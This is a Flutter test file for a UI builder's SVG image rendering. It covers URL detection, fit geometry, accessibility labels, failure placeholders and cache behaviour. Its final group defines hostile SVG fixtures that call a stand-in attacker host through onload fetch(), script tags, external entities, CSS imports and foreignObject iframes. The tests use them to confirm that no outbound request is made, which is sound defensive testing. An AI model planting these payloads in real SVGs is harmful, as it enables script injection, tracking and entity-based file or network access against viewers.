import 'package:hotlayout_flutter/src/render/icon_glyph.dart';
import 'package:flutter/material.dart';
import 'package:flutter_svg/flutter_svg.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:hotlayout_flutter/src/render/image_frame.dart';
import 'package:hotlayout_flutter/src/model/tokens.dart';
import 'package:hotlayout_flutter/src/model/ui_document.dart';
import 'package:hotlayout_flutter/src/render/svg_image.dart';

import 'support/fixtures.dart';
import 'support/http.dart';

/// Media library address: the object path is encoded ENTIRELY, slashes included.
const _storageSvg =
    'https://firebasestorage.googleapis.com/v0/b/ui-builder.appspot.com/o/'
    'orgs%2Facme%2Fprojects%2Fshop%2Fmedia%2Flogo.svg?alt=media';

/// Twice as wide as tall — deliberately NOT 16:9, so `cover` and `contain` in a
/// 16:9 frame give different geometry. In a square-in-square the difference is invisible.
const _wide =
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 20">'
    '<rect width="40" height="20" fill="#0a7"/></svg>';

UiDocument _docWithSvg(
  String url, {
  String? fit,
  String? alt,
  String aspectRatio = '16:9',
  String radius = 'md',
}) => docWith([
  {
    'id': 'img-1',
    'type': 'Image',
    'props': {
      'source': {'kind': 'url', 'url': url},
      'aspectRatio': aspectRatio,
      'fit': ?fit,
      'alt': ?alt,
    },
    // 9.0.0: rounding lives in `style` and is clipped by the node's shared box.
    'style': {'radius': radius},
  },
]);

/// The rectangle the SVG occupies AFTER fitting, in screen coordinates.
/// This is a `viewBox`-sized canvas inside the library's `FittedBox`.
Rect _paintedRect(WidgetTester tester) => tester.getRect(
  find.descendant(of: find.byType(SvgPicture), matching: find.byType(SizedBox)),
);

void main() {
  // Session memory is shared per process: without this the second test would get the
  // first one's file and prove nothing about the network.
  setUp(debugClearSvgStore);

  group('isSvgUrl', () {
    test(
      'storage address: path fully encoded, .svg comes before the query',
      () {
        expect(isSvgUrl(_storageSvg), isTrue);
      },
    );

    test('plain external link', () {
      expect(isSvgUrl('https://cdn.example.com/icons/star.svg'), isTrue);
    });

    test('query and fragment do not interfere', () {
      expect(isSvgUrl('https://cdn.example.com/a.svg?v=3&w=100'), isTrue);
      expect(isSvgUrl('https://cdn.example.com/a.svg#layer1'), isTrue);
      expect(isSvgUrl('https://cdn.example.com/a.svg?v=3#layer1'), isTrue);
    });

    test('extension case does not matter', () {
      expect(isSvgUrl('https://cdn.example.com/LOGO.SVG'), isTrue);
      expect(isSvgUrl('https://cdn.example.com/logo.Svg?alt=media'), isTrue);
    });

    test('.svg only in query or fragment — NOT an SVG', () {
      // Exactly what breaks a substring search: the string contains `.svg`, yet the image is
      // a raster.
      expect(isSvgUrl('https://cdn.example.com/photo.png?name=a.svg'), isFalse);
      expect(isSvgUrl('https://cdn.example.com/photo.png#a.svg'), isFalse);
      expect(isSvgUrl('https://cdn.example.com/render?file=logo.svg'), isFalse);
    });

    test('.svg mid-path — NOT an SVG', () {
      expect(isSvgUrl('https://cdn.example.com/a.svg/preview.png'), isFalse);
      expect(
        isSvgUrl(
          'https://firebasestorage.googleapis.com/v0/b/b/o/media%2Fa.svg%2Fthumb.png?alt=media',
        ),
        isFalse,
      );
      expect(isSvgUrl('https://cdn.example.com/a.svg/'), isFalse);
    });

    test('.svgz is not supported', () {
      expect(isSvgUrl('https://cdn.example.com/a.svgz'), isFalse);
      expect(isSvgUrl('https://cdn.example.com/a.svg.gz'), isFalse);
    });

    test('raster and look-alike extensions', () {
      expect(isSvgUrl('https://cdn.example.com/a.png'), isFalse);
      expect(isSvgUrl('https://cdn.example.com/asvg'), isFalse);
      expect(isSvgUrl('https://cdn.example.com/svg'), isFalse);
      expect(isSvgUrl('https://svg.example.com/'), isFalse);
      expect(isSvgUrl('https://example.svg'), isFalse);
    });

    test('garbage instead of an address does not throw', () {
      expect(isSvgUrl(''), isFalse);
      expect(isSvgUrl('не адреса'), isFalse);
      // `%ZZ` is not an escape at all — Dart reads it as a literal percent, so this
      // is a file with an odd name and an honest extension. The point is it does not throw.
      expect(isSvgUrl('https://cdn.example.com/%ZZ.svg'), isTrue);
      // A legal escape, but not UTF-8: parsing passes, decoding does not.
      expect(isSvgUrl('https://cdn.example.com/%FF.svg'), isFalse);
    });
  });

  group('Image with SVG', () {
    testWidgets('drawn through flutter_svg, not a raster Image', (
      tester,
    ) async {
      final net = installFakeHttp({_storageSvg: httpOk(_wide)});

      await pumpDocument(tester, _docWithSvg(_storageSvg));
      await tester.pumpAndSettle();

      expect(tester.takeException(), isNull);
      expect(find.byType(SvgPicture), findsOneWidget);
      expect(find.byType(Image), findsNothing);
      expect(find.text('Image unavailable'), findsNothing);
      expect(find.byType(CircularProgressIndicator), findsNothing);
      expect(net.requests.map((u) => u.toString()), [_storageSvg]);
    });

    testWidgets('a raster address still goes through Image.network', (tester) async {
      // Guard against the opposite mistake: "everything is SVG now".
      await pumpDocument(
        tester,
        _docWithSvg('https://cdn.example.com/photo.png?name=a.svg'),
      );

      expect(find.byType(Image), findsOneWidget);
      expect(find.byType(NetworkSvg), findsNothing);
    });

    testWidgets('same frame as a raster: aspect ratio and radius', (
      tester,
    ) async {
      installFakeHttp({_storageSvg: httpOk(_wide)});

      await pumpDocument(
        tester,
        _docWithSvg(_storageSvg, aspectRatio: '1:1', radius: 'lg'),
        theme: null,
      );
      await tester.pumpAndSettle();

      final frame = tester.getSize(find.byType(ImageFrame));
      expect(frame.width, frame.height);
      // The SVG fills the frame ENTIRELY, not its own 40×20: otherwise `fit` would have
      // nothing to fit, and the radius would clip empty space.
      expect(tester.getSize(find.byType(SvgPicture)), frame);

      final clip = tester.widget<ClipRRect>(
        find.ancestor(
          of: find.byType(SvgPicture),
          matching: find.byType(ClipRRect),
        ),
      );
      expect(clip.borderRadius, isNot(BorderRadius.zero));
    });

    // The list comes from the ENUM and the mapping from an exhaustive `switch`: a new
    // `fit` value in the contract will not compile here until it gets an
    // expectation for SVG too.
    for (final fit in ImageFitToken.values) {
      testWidgets('fit=${fit.name} reaches the SVG and changes the geometry', (
        tester,
      ) async {
        installFakeHttp({_storageSvg: httpOk(_wide)});

        await pumpDocument(tester, _docWithSvg(_storageSvg, fit: fit.name));
        await tester.pumpAndSettle();

        final frame = tester.getRect(find.byType(ImageFrame));
        final painted = _paintedRect(tester);
        // Fitting preserves the file's aspect ratio for any `fit`.
        expect(painted.width / painted.height, moreOrLessEquals(2));
        expect(painted.center.dx, moreOrLessEquals(frame.center.dx));
        expect(painted.center.dy, moreOrLessEquals(frame.center.dy));

        switch (fit) {
          case ImageFitToken.cover:
            expect(
              tester.widget<SvgPicture>(find.byType(SvgPicture)).fit,
              BoxFit.cover,
            );
            // The 16:9 frame is narrower than the 2:1 file — fill the height, sides are clipped.
            expect(painted.height, moreOrLessEquals(frame.height));
            expect(painted.width, greaterThan(frame.width));
            expect(
              tester.widget<SvgPicture>(find.byType(SvgPicture)).clipBehavior,
              isNot(Clip.none),
            );
          case ImageFitToken.contain:
            expect(
              tester.widget<SvgPicture>(find.byType(SvgPicture)).fit,
              BoxFit.contain,
            );
            // The whole file is visible: flush by width, margins above and below.
            expect(painted.width, moreOrLessEquals(frame.width));
            expect(painted.height, lessThan(frame.height));
        }
      });
    }

    testWidgets('no fit field — cover, as with a raster', (tester) async {
      installFakeHttp({_storageSvg: httpOk(_wide)});

      await pumpDocument(tester, _docWithSvg(_storageSvg));
      await tester.pumpAndSettle();

      expect(
        tester.widget<SvgPicture>(find.byType(SvgPicture)).fit,
        BoxFit.cover,
      );
    });

    testWidgets('alt goes into the semantics tree', (tester) async {
      final handle = tester.ensureSemantics();
      installFakeHttp({_storageSvg: httpOk(_wide)});

      await pumpDocument(
        tester,
        _docWithSvg(_storageSvg, alt: 'Логотип акції'),
      );
      await tester.pumpAndSettle();

      expect(find.bySemanticsLabel('Логотип акції'), findsOneWidget);
      expect(
        tester.getSemantics(find.bySemanticsLabel('Логотип акції')),
        matchesSemantics(label: 'Логотип акції', isImage: true),
      );
      handle.dispose();
    });

    testWidgets('alt is heard even when the file did not arrive', (tester) async {
      // The description belongs to the NODE, not to pixels: a raster behaves the same.
      final handle = tester.ensureSemantics();
      installFakeHttp({});

      await pumpDocument(
        tester,
        _docWithSvg(_storageSvg, alt: 'Логотип акції'),
      );
      await tester.pumpAndSettle();

      expect(find.bySemanticsLabel(RegExp('Логотип акції')), findsOneWidget);
      handle.dispose();
    });

    testWidgets('while the file is in flight — the same indicator as a raster', (
      tester,
    ) async {
      final net = installFakeHttp({})..silent.add(_storageSvg);

      await pumpDocument(tester, _docWithSvg(_storageSvg));
      await tester.pump(const Duration(milliseconds: 100));

      expect(find.byType(CircularProgressIndicator), findsOneWidget);
      expect(find.byType(SvgPicture), findsNothing);
      expect(find.text('Image unavailable'), findsNothing);
      expect(net.requests, hasLength(1));
    });

    testWidgets('a bound address pointing to an SVG is drawn the same way', (tester) async {
      installFakeHttp({_storageSvg: httpOk(_wide)});

      await pumpDocument(
        tester,
        docWith([
          {
            'id': 'img-1',
            'type': 'Image',
            'props': {
              'source': {
                'kind': 'binding',
                'path': 'item.image',
                'fallback': 'placeholder',
              },
              'aspectRatio': '16:9',
            },
          },
        ]),
        data: const {'item.image': _storageSvg},
      );
      await tester.pumpAndSettle();

      expect(find.byType(SvgPicture), findsOneWidget);
    });

    testWidgets('row thumbnail: one source, so SVG works there too', (
      tester,
    ) async {
      installFakeHttp({_storageSvg: httpOk(_wide)});

      await pumpDocument(
        tester,
        docWith([
          listTileNode(
            'Рядок',
            leading: {
              'kind': 'image',
              'source': {'kind': 'url', 'url': _storageSvg},
            },
          ),
        ]),
      );
      await tester.pumpAndSettle();

      expect(tester.takeException(), isNull);
      final size = tester.getSize(find.byType(SvgPicture));
      // The square slot is filled entirely — like a raster thumbnail.
      expect(size.width, size.height);
      expect(size.width, greaterThan(0));
    });

    testWidgets('one address in two nodes — one request', (tester) async {
      final net = installFakeHttp({_storageSvg: httpOk(_wide)});
      Map<String, Object?> image(String id) => {
        'id': id,
        'type': 'Image',
        'props': {
          'source': {'kind': 'url', 'url': _storageSvg},
          'aspectRatio': '16:9',
        },
      };

      await pumpDocument(tester, docWith([image('a'), image('b')]));
      await tester.pumpAndSettle();

      expect(find.byType(SvgPicture), findsNWidgets(2));
      expect(net.requests, hasLength(1));
    });
  });

  group('SVG: failure is a state, not an exception', () {
    Future<void> expectBroken(WidgetTester tester) async {
      await tester.pumpAndSettle();

      // No exception — neither in the tree nor uncaught in the test zone.
      expect(tester.takeException(), isNull);
      expect(find.text('Image unavailable'), findsOneWidget);
      expect(find.byWidgetPredicate((w) => w is IconGlyph && identical(w.icon, IconToken.parse('image'))), findsOneWidget);
      expect(find.byType(SvgPicture), findsNothing);
      expect(find.byType(CircularProgressIndicator), findsNothing);
    }

    testWidgets('404 — the same placeholder as a raster', (tester) async {
      // The storage's 404 body is JSON. The CODE decides, not whether the body parsed.
      installFakeHttp({_storageSvg: httpStatus(404, '{"error":{"code":404}}')});

      await pumpDocument(tester, _docWithSvg(_storageSvg));
      await expectBroken(tester);
    });

    testWidgets('failure with a VALID SVG in the body — still a failure', (tester) async {
      // Without the code check this would be drawn: a CDN error page that happens to
      // be an image would look like real content.
      installFakeHttp({_storageSvg: (statusCode: 500, body: _wide.codeUnits)});

      await pumpDocument(tester, _docWithSvg(_storageSvg));
      await expectBroken(tester);
    });

    testWidgets('no connectivity', (tester) async {
      installFakeHttp({}).unreachable.add(_storageSvg);

      await pumpDocument(tester, _docWithSvg(_storageSvg));
      await expectBroken(tester);
    });

    final garbage = <String, FakeHttpReply>{
      'empty body': httpOk(''),
      'HTML instead of SVG': httpOk(
        '<!doctype html><html><body>Sign in</body></html>',
      ),
      'JSON instead of SVG': httpOk('{"error": "nope"}'),
      'PNG under a .svg name': httpBytes([
        0x89,
        0x50,
        0x4e,
        0x47,
        0x0d,
        0x0a,
        0x1a,
        0x0a,
        0,
        255,
      ]),
      'truncated file': httpOk(
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 4 4"><rect width="4"',
      ),
      'XML but not SVG': httpOk('<?xml version="1.0"?><note><to>x</to></note>'),
      'SVG without size and viewBox': httpOk(
        '<svg xmlns="http://www.w3.org/2000/svg"><rect width="4" height="2"/></svg>',
      ),
    };
    for (final MapEntry(key: name, value: reply) in garbage.entries) {
      testWidgets('broken content: $name', (tester) async {
        installFakeHttp({_storageSvg: reply});

        await pumpDocument(tester, _docWithSvg(_storageSvg));
        await expectBroken(tester);
      });
    }

    testWidgets('in a thumbnail — a crossed-out icon without a label', (tester) async {
      installFakeHttp({});

      await pumpDocument(
        tester,
        docWith([
          listTileNode(
            'Рядок',
            leading: {
              'kind': 'image',
              'source': {'kind': 'url', 'url': _storageSvg},
            },
          ),
        ]),
      );
      await tester.pumpAndSettle();

      expect(tester.takeException(), isNull);
      expect(find.byWidgetPredicate((w) => w is IconGlyph && identical(w.icon, IconToken.parse('image'))), findsOneWidget);
      expect(find.text('Image unavailable'), findsNothing);
    });

    testWidgets('failure is not remembered: the next display tries again', (
      tester,
    ) async {
      // The library's stock loader keeps a failed request in its cache until the
      // app restarts — one network drop would break the picture for the whole
      // session. That is why the network here is our own.
      final net = installFakeHttp({});

      await pumpDocument(tester, _docWithSvg(_storageSvg));
      await expectBroken(tester);

      net.replies[_storageSvg] = httpOk(_wide);
      await tester.pumpWidget(const SizedBox());
      await pumpDocument(tester, _docWithSvg(_storageSvg));
      await tester.pumpAndSettle();

      expect(find.byType(SvgPicture), findsOneWidget);
      expect(net.requests, hasLength(2));
    });
  });

  group('SVG: we do not trust the content', () {
    const evil = 'https://evil.example.com';

    /// Everything an SVG can use to call a foreign address or code, in one file.
    /// A green rectangle at the end keeps the file drawable: what is checked is
    /// not "rejected" but "drawn without going anywhere".
    const hostile =
        '<?xml version="1.0"?>'
        '<!DOCTYPE svg [<!ENTITY ext SYSTEM "$evil/entity.txt">]>'
        '<?xml-stylesheet href="$evil/sheet.css" type="text/css"?>'
        '<svg xmlns="http://www.w3.org/2000/svg" '
        'xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 40 20" '
        'onload="fetch(\'$evil/onload\')" onclick="location=\'$evil/click\'">'
        '<script>fetch("$evil/inline")</script>'
        '<script href="$evil/script.js"/>'
        '<script xlink:href="$evil/script-xlink.js"/>'
        '<style>@import url("$evil/import.css");'
        ' rect { fill: url("$evil/paint.svg#p"); }'
        ' @font-face { font-family: x; src: url("$evil/font.woff2"); }</style>'
        '<image href="$evil/image.png" width="10" height="10"/>'
        '<image xlink:href="$evil/image-xlink.png" width="10" height="10"/>'
        '<use href="$evil/sprite.svg#icon"/>'
        '<use xlink:href="$evil/sprite-xlink.svg#icon"/>'
        '<a href="$evil/link"><rect width="4" height="4" onmouseover="alert(1)"/></a>'
        '<foreignObject width="10" height="10">'
        '<iframe xmlns="http://www.w3.org/1999/xhtml" src="$evil/frame"/>'
        '<img xmlns="http://www.w3.org/1999/xhtml" src="$evil/img.png" onerror="alert(1)"/>'
        '</foreignObject>'
        '<rect width="40" height="20" fill="url($evil/gradient.svg#g)"/>'
        '<rect width="40" height="20" filter="url($evil/filter.svg#f)" fill="#0a7"/>'
        '<text x="0" y="10">&ext;</text>'
        '</svg>';

    testWidgets('hostile file: the only request is the file itself, the widget is alive', (
      tester,
    ) async {
      // The fake sits at the `dart:io` level, i.e. BELOW the library: a request
      // made by any of its layers would land in this list.
      final net = installFakeHttp({_storageSvg: httpOk(hostile)});

      await pumpDocument(tester, _docWithSvg(_storageSvg));
      await tester.pumpAndSettle();
      // Allowance for deferred work: a request the library would make "later".
      await tester.pump(const Duration(seconds: 5));

      expect(tester.takeException(), isNull);
      expect(net.requests.map((u) => u.toString()), [_storageSvg]);
      expect(net.requests.where((u) => u.host.contains('evil')), isEmpty);
      // Actually DRAWN: the dangerous parts are skipped, the rest of the file stays
      // a picture. A placeholder here would mean that an editor-decorated file
      // (metadata, links) is not shown in the app at all.
      expect(find.byType(SvgPicture), findsOneWidget);
      expect(find.text('Image unavailable'), findsNothing);
    });

    testWidgets('each hostile element separately — also without foreign requests', (
      tester,
    ) async {
      // Separately, because in a shared file one element could stop the parse
      // before the queue reaches the next, leaving it unchecked.
      const svg =
          'xmlns="http://www.w3.org/2000/svg" '
          'xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 4 4"';
      const cases = [
        '<svg $svg onload="fetch(\'$evil/a\')"><rect width="4" height="4"/></svg>',
        '<svg $svg><script>fetch("$evil/a")</script><rect width="4" height="4"/></svg>',
        '<svg $svg><script href="$evil/a.js"/><rect width="4" height="4"/></svg>',
        '<svg $svg><image href="$evil/a.png" width="4" height="4"/></svg>',
        '<svg $svg><image xlink:href="$evil/a.png" width="4" height="4"/></svg>',
        '<svg $svg><use href="$evil/a.svg#i"/><rect width="4" height="4"/></svg>',
        '<svg $svg><style>@import url("$evil/a.css");</style><rect width="4" height="4"/></svg>',
        '<svg $svg><rect width="4" height="4" fill="url($evil/a.svg#g)"/></svg>',
        '<svg $svg><foreignObject width="4" height="4">'
            '<img xmlns="http://www.w3.org/1999/xhtml" src="$evil/a.png"/>'
            '</foreignObject><rect width="4" height="4"/></svg>',
        '<!DOCTYPE svg [<!ENTITY e SYSTEM "$evil/a">]>'
            '<svg $svg><text>&e;</text><rect width="4" height="4"/></svg>',
      ];
      final urls = [
        for (var i = 0; i < cases.length; i++)
          'https://cdn.example.com/h$i.svg',
      ];
      final net = installFakeHttp({
        for (var i = 0; i < cases.length; i++) urls[i]: httpOk(cases[i]),
      });

      for (final url in urls) {
        await pumpDocument(tester, _docWithSvg(url));
        await tester.pumpAndSettle();
        await tester.pump(const Duration(seconds: 5));

        expect(tester.takeException(), isNull, reason: url);
        expect(find.byType(SvgPicture), findsOneWidget, reason: url);
      }

      expect(net.requests.map((u) => u.toString()), urls);
    });
  });
}
